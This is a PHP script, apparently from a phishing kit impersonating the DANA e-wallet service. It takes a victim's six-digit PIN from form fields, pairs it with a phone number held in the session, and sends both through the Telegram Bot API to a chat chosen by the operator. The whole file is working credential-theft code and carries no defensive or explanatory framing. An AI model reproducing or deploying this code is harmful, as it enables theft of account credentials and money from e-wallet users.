<?php

session_start();
include "tele.php";

$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$pin5 = $_POST['pin5'];
$pin6 = $_POST['pin6'];
$pin = $pin1.$pin2.$pin3.$pin4.$pin5.$pin6;

$nohp        = $_SESSION['nohp'];
$_SESSION['acc_pin'] = $pin;

$message = "
──────────────────────
DANA | AKUN | ".$nohp."
──────────────────────
• No HP     : ".$nohp."
• Pin       : ".$pin."
──────────────────────";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
// header('Location: ./../dana_pin/');
?>